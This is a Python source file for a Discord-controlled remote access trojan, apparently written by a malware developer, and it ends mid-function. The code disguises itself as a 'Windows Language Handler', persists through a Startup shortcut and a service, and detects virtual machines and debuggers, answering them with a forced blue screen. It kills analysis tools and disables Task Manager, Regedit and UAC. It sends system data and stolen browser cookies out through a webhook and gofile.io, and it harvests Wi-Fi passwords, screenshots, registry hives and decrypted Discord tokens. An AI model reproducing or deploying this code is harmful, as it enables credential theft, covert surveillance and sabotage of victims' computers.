# cython: language_level=3

import getpass
import sys
import mss
from PIL import Image
import discord
from discord.ext import commands
import urllib.request
import platform
import psutil
import requests
import subprocess
import ctypes
import os
import win32api
import win32process
import win32con 
import win32security 
import winreg
from re import findall
import tempfile
import pyminizip
import asyncio
import random
import string
import webbrowser
from base64 import b64decode
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import win32crypt
from json import loads, dumps
import time
import socket
from datetime import datetime, timedelta
import base64
import sqlite3
import shutil
from browser_history import get_history
import browser_cookie3
import re
import win32serviceutil
import win32service
import win32event
import servicemanager
import signal
from cryptography.fernet import Fernet
import configparser
import json
import threading
from ctypes import windll
from zipfile import ZipFile
import win32serviceutil
import win32service
import win32event
import servicemanager
import subprocess


config = configparser.ConfigParser()
config.read('configuration.ini')


"""BOT_TOKEN = config['Client']['bt']
WEBHOOK_URL = config['Client']['wh']"""

BOT_TOKEN = "Your Bot Token"
WEBHOOK_URL = "Your Webhook"

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

def get_external_ip():
    ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
    return ip

def get_ip_info(ip):
    response = urllib.request.urlopen(f'https://ipinfo.io/{ip}/json')
    data = json.loads(response.read().decode())
    return {
        "ISP": data.get("org", "Unknown"),
        "City": data.get("city", "Unknown"),
        "Region": data.get("region", "Unknown"),
        "Country": data.get("country", "Unknown"),
        "Postal": data.get("postal", "Unknown"),
    }


@bot.command()
async def persistance(ctx):
    class MyService(win32serviceutil.ServiceFramework):
        _svc_name_ = "LanguageHandler"
        _svc_display_name_ = "Windows Language Handler"
        _svc_description_ = "Windows Language Handler is a system component that provides language support."

        def __init__(self, args):
            win32serviceutil.ServiceFramework.__init__(self, args)
            self.stop_event = win32event.CreateEvent(None, 0, 0, None)
            self.running = True
            self.process = None

        def SvcStop(self):
            self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
            win32event.SetEvent(self.stop_event)
            self.running = False
            if self.process:
                self.process.terminate()
                self.process.wait()

        def SvcRun(self):
            servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED, (self._svc_name_, ''))

            python_executable = r"C:\Users\DENİZ\AppData\Local\Programs\Python\Python312\python.exe"
            script_to_run = r"C:\Users\DENİZ\Desktop\MalwareDev\ratatata\vector.exe"

            try:
                self.process = subprocess.Popen([python_executable, script_to_run])
            except Exception as e:
                servicemanager.LogErrorMsg(f"Process could not be started: {str(e)}")

            while self.running:
                win32event.WaitForSingleObject(self.stop_event, 5000)

    win32serviceutil.HandleCommandLine(MyService)


def get_hwid():
    import subprocess
    return subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

def get_user_count():
    users = [u.name for u in psutil.users()]
    return len(users) 
def get_disks():
    partitions = psutil.disk_partitions()
    disk_info = []
    
    for partition in partitions:
       
        disk_info.append({
            "device": partition.device,
            "mountpoint": partition.mountpoint,
            "fstype": partition.fstype,
            "opts": partition.opts
        })
    
    return disk_info
def get_system_info():
    uname = platform.uname()
    ram = psutil.virtual_memory()
    uptime = time.time() - psutil.boot_time()
    uptime_hours = uptime // 3600
    uptime_minutes = (uptime % 3600) // 60

    system_info = {
        "OS": uname.system,
        "Hostname": uname.node,
        "Release": uname.release,
        "Version": uname.version,
        "Machine": uname.machine,
        "Processor": uname.processor,
        "RAM": f"{ram.total / (1024 ** 3):.2f} GB",
        "Uptime": f"{int(uptime_hours)} hours, {int(uptime_minutes)} minutes",
        "Local IP": socket.gethostbyname(socket.gethostname()),
        "HWID": get_hwid(),
        "User Count": get_user_count(),
        "Disks": get_disks() 
    }

    return system_info

def send_info_to_webhook(info, ip, ip_info):
    message = f"**🌐 System Information:**\n"
    message += f"**🛠 External IP Address**: {ip}\n"
    message += f"**🛠 ISP**: {ip_info['ISP']}\n"
    message += f"**🌍 Country**: {ip_info['Country']}\n"
    message += f"**🏙 City**: {ip_info['City']}\n"
    message += f"**📬 Postal Code**: {ip_info['Postal']}\n"
    message += f"**🖥 OS**: {info['OS']}\n"
    message += f"**🏷 Hostname**: {info['Hostname']}\n"
    message += f"**🔧 Release**: {info['Release']}\n"
    message += f"**📜 Version**: {info['Version']}\n"
    message += f"**🖥 Machine**: {info['Machine']}\n"
    message += f"**🧠 Processor**: {info['Processor']}\n"
    message += f"**💾 RAM**: {info['RAM']}\n"
    message += f"**⏳ Uptime**: {info['Uptime']}\n"
    message += f"**🌐 Local IP**: {info['Local IP']}\n"
    message += f"**🔑 HWID**: {info['HWID']}\n"
    message += f"**👥 User Count**: {info['User Count']}\n"
    message += "**💽 Disks:** " 
    disk_info_list = []
    for disk in info['Disks']:
        disk_info_list.append(f"Device: {disk['mountpoint']}")

    message += ", ".join(disk_info_list) + "\n"

    data = {"content": message}
    requests.post(WEBHOOK_URL, json=data)

def collect_cookies():
    temp_path = os.getenv("TEMP")
    file_path = os.path.join(temp_path, "cookies.txt")

    try:
        cookies_data = []

        chrome_cookies = browser_cookie3.chrome()
        for cookie in chrome_cookies:
            cookies_data.append(f"Chrome: {cookie.name}={cookie.value}; Domain={cookie.domain}; Path={cookie.path}")

        firefox_cookies = browser_cookie3.firefox()
        for cookie in firefox_cookies:
            cookies_data.append(f"Firefox: {cookie.name}={cookie.value}; Domain={cookie.domain}; Path={cookie.path}")

        edge_cookies = browser_cookie3.edge()
        for cookie in edge_cookies:
            cookies_data.append(f"Edge: {cookie.name}={cookie.value}; Domain={cookie.domain}; Path={cookie.path}")

        opera_cookies = browser_cookie3.opera()
        for cookie in opera_cookies:
            cookies_data.append(f"Opera: {cookie.name}={cookie.value}; Domain={cookie.domain}; Path={cookie.path}")

        brave_cookies = browser_cookie3.brave()
        for cookie in brave_cookies:
            cookies_data.append(f"Brave: {cookie.name}={cookie.value}; Domain={cookie.domain}; Path={cookie.path}")

        vivaldi_cookies = browser_cookie3.vivaldi()
        for cookie in vivaldi_cookies:
            cookies_data.append(f"Vivaldi: {cookie.name}={cookie.value}; Domain={cookie.domain}; Path={cookie.path}")

        with open(file_path, "w", encoding='utf-8') as f:
            f.write("\n".join(cookies_data))

        upload_url = "https://api.gofile.io/servers"
        server_response = requests.get(upload_url)

        if server_response.status_code == 200:
            servers = server_response.json()['data']['servers']
            if servers:
                server_name = servers[0]['name']
                upload_url = f'https://{server_name}.gofile.io/contents/uploadfile'
                
                with open(file_path, 'rb') as f:
                    files = {'file': f}
                    response = requests.post(upload_url, files=files)

                if response.status_code == 200:
                    json_response = response.json()
                    if json_response['status'] == 'ok':
                        download_link = json_response['data']['downloadPage']
                        return download_link
                    else:
                        return f"[!] Error during upload: {json_response['message']}"
                else:
                    return f"[!] HTTP Error: {response.status_code} - {response.text}"
            else:
                return "[!] Server not found."
        else:
            return "[!] Unable to retrieve server information."

    except Exception as e:
        return f"[!] Error: {str(e)}"
    
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

def protection_check():
    vm_files = [
        "C:\\windows\\system32\\vmGuestLib.dll",
        "C:\\windows\\system32\\vm3dgl.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vmsrvc.dll",
        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
    ]
    
    blacklisted_processes = [
        'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 
        'fakenet.exe', 'dumpcap.exe', 'httpdebuggerui.exe', 
        'wireshark.exe', 'fiddler.exe', 'vboxservice.exe', 
        'df5serv.exe', 'vboxtray.exe', 'ida64.exe', 
        'ollydbg.exe', 'pestudio.exe', 'vgauthservice.exe', 
        'vmacthlp.exe', 'x96dbg.exe', 'x32dbg.exe', 
        'prl_cc.exe', 'prl_tools.exe', 'xenservice.exe', 
        'qemu-ga.exe', 'joeboxcontrol.exe', 'ksdumperclient.exe', 
        'ksdumper.exe', 'joeboxserver.exe'
    ]

    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            return True
            
    for file_path in vm_files:
        if os.path.exists(file_path):
            return True

    return False

def trigger_bsod():
    ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 0x00000000)

def monitor_processes_and_bsod():
    def kill_process(process_name):
        for proc in psutil.process_iter(attrs=['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                os.kill(proc.info['pid'], signal.SIGTERM)
                print(f"{process_name} process terminated (PID: {proc.info['pid']}).")
                return
        print(f"{process_name} process not found.")

    def create_bsod():
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, True, False, ctypes.pointer(ctypes.c_long()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000420, 0, 0, None, 6, ctypes.pointer(ctypes.c_long()))

    reverse_engineering_processes = [
        "ollydbg.exe",
        "x64dbg.exe",
        "ida.exe",
        "ida64.exe",
        "windbg.exe",
        "ghidra.exe",
        "dnspy.exe",
        "ilspy.exe",
        "dotpeek.exe",
        "resource hacker.exe",
        "frida.exe",
        "radare2.exe",
        "binary ninja.exe",
        "cutter.exe",
        "hxd.exe",
        "reclss.exe",
        "cff explorer.exe",
        "pe explorer.exe",
        "process hacker.exe",
        "wireshark.exe",
        "fiddler.exe",
        "burpsuite.exe",
        "charles.exe",
        "tcpview.exe",
        "hijackthis.exe",
        "httpview.exe",
        "netstat.exe",
        "hwinfo.exe",
        "themida.exe"
    ]
    
    for process in reverse_engineering_processes:
        kill_process(process)

    create_bsod()


@bot.event
async def on_ready():
    if protection_check():
        trigger_bsod()
        return

    if not os.path.exists(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsLanguageHandler.lnk"):
        startup_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        app_path = os.path.abspath(sys.argv[0]) 
        shortcut_name = "WindowsLanguageHandler.lnk"

        # Kısa yol oluşturma
        import pythoncom
        import win32com.client

        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(os.path.join(startup_path, shortcut_name))
        shortcut.TargetPath = app_path
        shortcut.WorkingDirectory = os.path.dirname(app_path)
        shortcut.save()
        #print("Alternative startup method created.")


    user_ip = get_external_ip()
    system_info = get_system_info()
    ip_info = get_ip_info(user_ip)

   
    monitor_processes_and_bsod()

    send_info_to_webhook(system_info, user_ip, ip_info)

    cookie_link = collect_cookies()
    if cookie_link:
        requests.post(WEBHOOK_URL, json={"content": cookie_link})

    #print("Bot started and system information sent.")


@bot.command()
async def opencmd(ctx):
    await ctx.send("Opening CMD...")
    try:
        subprocess.Popen("cmd.exe", shell=True)
        await ctx.send("Cmd launch initiated successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def admincheck(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        await ctx.send("[*] Congrats you're admin")
    else:
        await ctx.send("[!] Sorry, you're not admin")

@bot.command()
async def listprocess(ctx):
    processes = []
    computer_name = platform.node()

    for proc in psutil.process_iter(['pid', 'name', 'status']):
        try:
            handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, proc.info['pid'])
            token = win32security.OpenProcessToken(handle, win32security.TOKEN_QUERY)
            privileges = win32security.GetTokenInformation(token, win32security.TokenPrivileges)

            is_admin = any(priv[0] == win32security.SE_DEBUG_NAME for priv in privileges)
            admin_status = "Yes" if is_admin else "No"
            processes.append(f"PID: {proc.info['pid']} | Name: {proc.info['name']} | Status: {proc.info['status']} | Admin: {admin_status}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, win32api.error):
            pass

    txtname = os.urandom(5).hex()
    temp = os.getenv('TEMP')
    output_file = os.path.join(temp, f"{txtname}.txt")

    if processes:
        if os.path.isfile(output_file):
            os.remove(output_file)
        with open(output_file, 'a') as f1:
            f1.write(f"Processes for {computer_name}:\n\n")
            f1.write("\n".join(processes))
            f1.write(f"\n\nEnd of processes for {computer_name}.")

        file = discord.File(output_file, filename=f"{txtname}.txt")
        await ctx.send("[*] Command successfully executed. See attached file.", file=file)

        os.remove(output_file)
    else:
        await ctx.send("[*] No processes found.")



@bot.command()
async def takess(ctx):
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        temp = os.getenv('TEMP')
        screenshot_path = os.path.join(temp, "screenshot.png")
        screenshot_image = Image.frombytes('RGB', (screenshot.width, screenshot.height), screenshot.rgb)
        screenshot_image.save(screenshot_path)

    server_response = requests.get('https://api.gofile.io/servers')
    if server_response.status_code == 200:
        servers = server_response.json()['data']['servers']
        if servers:
            server_name = servers[0]['name']
            upload_url = f'https://{server_name}.gofile.io/contents/uploadfile'
        else:
            await ctx.send("[!] No server found.")
            os.remove(screenshot_path)
            return
    else:
        await ctx.send("[!] Unable to fetch server information.")
        os.remove(screenshot_path)
        return

    try:
        with open(screenshot_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(upload_url, files=files)

        if response.status_code == 200:
            json_response = response.json()
            if json_response['status'] == 'ok':
                download_link = json_response['data']['downloadPage']
                await ctx.send(download_link)
            else:
                await ctx.send(f"[!] Error during upload: {json_response['message']}")
        else:
            await ctx.send(f"[!] HTTP Error: {response.status_code} - {response.text}")

    except Exception as e:
        await ctx.send(f"[!] Error: {str(e)}")

    os.remove(screenshot_path)


@bot.command()
async def disreg(ctx):
    try:
        # Kayit Defteri'ni devre dişi birakma komutu
        command_disable = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f'
        subprocess.run(command_disable, shell=True)

        # Kayit Defteri açilmasini önlemek için başka bir anahtar
        command_prevent = r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f'
        subprocess.run(command_prevent, shell=True)

        await ctx.send("Regedit Disabled.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def distm(ctx):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)

        block_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, block_key_path) as block_key:
            winreg.SetValueEx(block_key, "DisallowRun", 0, winreg.REG_DWORD, 1)

            apps_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, apps_key_path) as apps_key:
                blocked_apps = ["ProcessHacker.exe", "TaskManager.exe"]
                for index, app in enumerate(blocked_apps):
                    winreg.SetValueEx(apps_key, f"1{index + 1}", 0, winreg.REG_SZ, app)

        await ctx.send("[*] Task Manager and Process Hacker Disabled.")
    except Exception as e:
        await ctx.send(f"[!] An error occurred: {str(e)}")

@bot.command()
async def gwpass(ctx):
    txtname = os.urandom(7).hex()
    temp = os.getenv('TEMP')
    output_file = os.path.join(temp, f"{txtname}.txt")

    try:
        command = "netsh wlan show profiles"
        profiles = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='utf-8', errors='ignore')

        wifi_info = []
        for line in profiles.splitlines():
            if "All User Profile" in line:
                profile_name = line.split(":")[1].strip().replace('"', '')

                password_command = f"netsh wlan show profile \"{profile_name}\" key=clear"
                
                try:
                    password_info = subprocess.check_output(password_command, shell=True, stderr=subprocess.STDOUT, encoding='utf-8', errors='ignore')
                except subprocess.CalledProcessError:
                    password_info = ""

                password = "Not Found"
                for password_line in password_info.splitlines():
                    if "Key Content" in password_line:
                        password = password_line.split(":")[1].strip()

                ip_info = requests.get('https://ipinfo.io').json()
                ip_address = ip_info.get('ip', 'Unknown')
                city = ip_info.get('city', 'Unknown')
                country = ip_info.get('country', 'Unknown')

                wifi_info.append(f"SSID: {profile_name} | Password: {password} | IP: {ip_address} | Location: {city}, {country}")

        if wifi_info:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(wifi_info))

            file = discord.File(output_file, filename=f"{txtname}.txt")
            await ctx.send("[*] Network information, passwords, and location data successfully retrieved.", file=file)

            os.remove(output_file)
        else:
            await ctx.send("[*] No network profiles found.")
    except Exception as e:
        await ctx.send(f"[!] An error occurred: {str(e)}")

@bot.command()
async def kproc(ctx, *, process_name: str):
    try:
        processes = [proc for proc in psutil.process_iter(['pid', 'name']) if proc.info['name'] == process_name]

        if not processes:
            await ctx.send(f"[!] No process found with the name '{process_name}'.")
            return

        for proc in processes:
            proc.terminate()
            await ctx.send(f"[+] '{process_name}' process terminated. PID: {proc.info['pid']}")

    except Exception as e:
        await ctx.send(f"[!] An error occurred: {str(e)}")

@bot.command()
async def rmvstup(ctx, *, app_name: str):
    try:
        paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
        ]

        removed = False
        for path in paths:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS) as key:
                try:
                    winreg.DeleteValue(key, app_name)
                    removed = True
                except FileNotFoundError:
                    continue

        if removed:
            await ctx.send(f"[+] '{app_name}' removed from startup.")
        else:
            await ctx.send(f"[!] '{app_name}' not found in startup.")

    except Exception as e:
        await ctx.send(f"[!] An error occurred: {str(e)}")

@bot.command()
async def liststup(ctx):
    txtname = os.urandom(7).hex()
    temp = os.getenv('TEMP')
    output_file = os.path.join(temp, f"{txtname}.txt")

    try:
        startup_apps = []
        services_info = []
        admin_apps = []

        paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
        ]

        for path in paths:
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
                    for i in range(winreg.QueryInfoKey(key)[1]):
                        app_name = winreg.EnumValue(key, i)[0]
                        startup_apps.append(app_name)
            except FileNotFoundError:
                continue

        for app in startup_apps:
            try:
                output = subprocess.check_output(f'sc query "{app}"', shell=True, stderr=subprocess.STDOUT, encoding='utf-8', errors='ignore')
                service_name = ""

                if "RUNNING" in output:
                    service_name = output.split("SERVICE_NAME:")[1].split()[0]
                    services_info.append(f"{app} (Service is running, Service Name: {service_name})")
                
                handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, app)
                token = win32security.OpenProcessToken(handle, win32security.TOKEN_QUERY)
                privileges = win32security.GetTokenInformation(token, win32security.TokenPrivileges)
                is_admin = any(priv[0] == win32security.SE_DEBUG_NAME for priv in privileges)

                if is_admin:
                    admin_apps.append(app)

            except subprocess.CalledProcessError:
                continue
            except Exception as e:
                continue

        with open(output_file, 'w', encoding='utf-8') as f:
            if startup_apps:
                f.write("[*] Applications that start at boot:\n")
                f.write("\n".join(startup_apps) + "\n")
            else:
                f.write("[*] No startup applications found.\n")

            if services_info:
                f.write("[*] Applications that create services:\n")
                f.write("\n".join(services_info) + "\n")
            else:
                f.write("[*] No applications that create services found.\n")

            if admin_apps:
                f.write("[*] Applications requiring admin permission:\n")
                f.write("\n".join(admin_apps) + "\n")
            else:
                f.write("[*] No applications requiring admin permission found.\n")

        file = discord.File(output_file, filename=f"{txtname}.txt")
        await ctx.send("[*] Startup information successfully retrieved.", file=file)

        os.remove(output_file)

    except Exception as e:
        await ctx.send(f"[!] An error occurred: {str(e)}")

@bot.command()
async def dreg(ctx, hive: str):
    valid_hives = ["HKCU", "HKLM", "HKU", "HKCR", "HKCC"]
    
    if hive not in valid_hives:
        await ctx.send(f"[!] Invalid registry hive. Valid hives: {', '.join(valid_hives)}")
        return

    rziname = os.urandom(3).hex()
    zip_name = f"{rziname}.zip"

    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            reg_file_name = f"{hive.replace('HKEY_', '')}.reg"
            reg_file_path = os.path.join(temp_dir, reg_file_name)

            command = f'reg export {hive} "{reg_file_path}" /y'
            subprocess.check_call(command, shell=True)

            zip_path = os.path.join(os.environ['TEMP'], zip_name)
            pyminizip.compress_multiple([reg_file_path], [], zip_path, 0)

            server_response = await asyncio.to_thread(requests.get, 'https://api.gofile.io/servers', timeout=10)
            if server_response.status_code == 200:
                servers = server_response.json()['data']['servers']
                if servers:
                    server_name = servers[0]['name']
                    upload_url = f'https://{server_name}.gofile.io/contents/uploadfile'
                else:
                    await ctx.send("[!] No server found.")
                    return
            else:
                await ctx.send("[!] Unable to retrieve server information.")
                return

            with open(zip_path, 'rb') as f:
                files = {'file': f}
                response = await asyncio.to_thread(requests.post, upload_url, files=files, timeout=10)

            if response.status_code == 200:
                json_response = response.json()
                if json_response['status'] == 'ok':
                    download_link = json_response['data']['downloadPage']
                    await ctx.send(f"[*] Registry file successfully uploaded: {download_link}")
                else:
                    await ctx.send(f"[!] An error occurred during upload: {json_response['message']}")
            else:
                await ctx.send(f"[!] HTTP Error: {response.status_code} - {response.text}")

    except Exception as e:
        await ctx.send(f"[!] Error: {str(e)}")

# Required constants
DESKTOP_CREATE = 0x00000001
DESKTOP_ENUM = 0x00000002
DESKTOP_WRITEOBJECTS = 0x00000004
DESKTOP_READOBJECTS = 0x00000008
DESKTOP_ACCESS = (DESKTOP_CREATE | DESKTOP_ENUM | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS)

def generate_desktop_name(length=8):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

desktops = []

@bot.command()
async def cndesk(ctx):
    desktop_name = generate_desktop_name()
    hDesktop = ctypes.windll.user32.CreateDesktopW(desktop_name, None, None, 0, DESKTOP_ACCESS, None)

    if hDesktop:
        ctypes.windll.user32.SwitchDesktop(hDesktop)
        desktops.append(desktop_name)

        await ctx.send(f"A new desktop named {desktop_name} has been created and switched to.")
    else:
        await ctx.send("Failed to create new desktop.")

@bot.command()
async def switchdesk(ctx, *, desktop_name: str):
    if desktop_name in desktops:
        hDesktop = ctypes.windll.user32.OpenDesktopW(desktop_name, 0, False, DESKTOP_ACCESS)
        if hDesktop:
            ctypes.windll.user32.SwitchDesktop(hDesktop)
            await ctx.send(f"Switched to desktop named {desktop_name}.")
        else:
            await ctx.send(f"Failed to switch to desktop named {desktop_name}.")
    else:
        await ctx.send(f"[!] Invalid desktop name. Current desktops: {', '.join(desktops)}")

@bot.command()
async def listdesks(ctx):
    if desktops:
        await ctx.send(f"Current desktops: {', '.join(desktops)}")
    else:
        await ctx.send("[!] No desktops have been created yet.")

@bot.command()
async def listbrw(ctx):
    browsers = []

    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Mozilla Firefox\firefox.exe",
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files\Opera\launcher.exe",
        r"C:\Program Files\Yandex\YandexBrowser\Application\browser.exe",
        r"C:\Program Files\Vivaldi\Application\vivaldi.exe",
        r"C:\Program Files\Arc\Arc.exe",
        r"C:\Program Files\Safari\Safari.exe",
    ]

    for path in paths:
        if os.path.exists(path):
            browsers.append(os.path.basename(path))

    if browsers:
        await ctx.send(f"Installed browsers: {', '.join(browsers)}")
    else:
        await ctx.send("No browsers found.")

@bot.command()
async def ows(ctx, url: str, browser: str):
    paths = {
        "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        "edge": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        "firefox": r"C:\Program Files\Mozilla Firefox\firefox.exe",
        "brave": r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        "opera": r"C:\Program Files\Opera\launcher.exe",
        "yandex": r"C:\Program Files\Yandex\YandexBrowser\Application\browser.exe",
        "vivaldi": r"C:\Program Files\Vivaldi\Application\vivaldi.exe",
        "arc": r"C:\Program Files\Arc\Arc.exe",
        "safari": r"C:\Program Files\Safari\Safari.exe",
    }

    browser_path = paths.get(browser.lower())
    
    if browser_path and os.path.exists(browser_path):
        try:
            subprocess.Popen([browser_path, url])
            await ctx.send(f"{url} opened with {browser}.")
        except Exception as e:
            await ctx.send(f"[!] Error: {str(e)}")
    else:
        await ctx.send(f"[!] Invalid browser name: {browser}. Please check with `!listbrw`.")

def genrandname(length=4):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

@bot.command()
async def gtoken(ctx):
    txtname = genrandname() 
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    
    PATHS = [
        ROAMING + "\\Discord",
        ROAMING + "\\discordcanary",
        ROAMING + "\\discordptb",
        LOCAL + "\\Google\\Chrome\\User Data\\Default",
        ROAMING + "\\Opera Software\\Opera Stable",
        LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
        LOCAL + "\\Discord\\Local Storage\\leveldb",
        LOCAL + "\\discordcanary\\Local Storage\\leveldb",
        LOCAL + "\\Lightcord\\Local Storage\\leveldb",
        LOCAL + "\\discordptb\\Local Storage\\leveldb",
        ROAMING + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        ROAMING + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
        LOCAL + "\\Amigo\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\Torch\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\Kometa\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\Orbitum\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\CentBrowser\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
        LOCAL + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        LOCAL + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
        LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
        LOCAL + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
        LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
        LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb"
    ]

    regex1 = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"
    regex2 = r"mfa\\.[\\w-]{84}"
    encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"

    def getheaders(token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def get_master_key(path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # Çözmek için gerekli
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def gettokens(path):
        tokens = []
        path += "\\Local Storage\\leveldb"
        try:
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in findall(regex1, line):
                        tokens.append(token)
                    for token in findall(regex2, line):
                        tokens.append(token)
                    for y in findall(encrypted_regex, line):
                        token = decrypt_password(b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path))
                        if token not in tokens:
                            tokens.append(token)
            return tokens
        except Exception as e:
            return []

    alltokens = []
    for i in PATHS:
        e = gettokens(i)
        alltokens.extend(e)

    if alltokens:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as temp_file:
            temp_file.write("\n".join(alltokens).encode())
            temp_file_path = temp_file.name

        await ctx.send(file=discord.File(temp_file_path, filename=f"{txtname}.txt"))
        os.remove(temp_file_path)
    else:
        await ctx.send("[!] No tokens found.")

file_name, nanoseconds = None, None

def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key(browser):
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], f'AppData\\Local\\{browser}\\User Data\\Local State')
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except Exception as e:
        print(f"Hata: {e}")
        return None

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
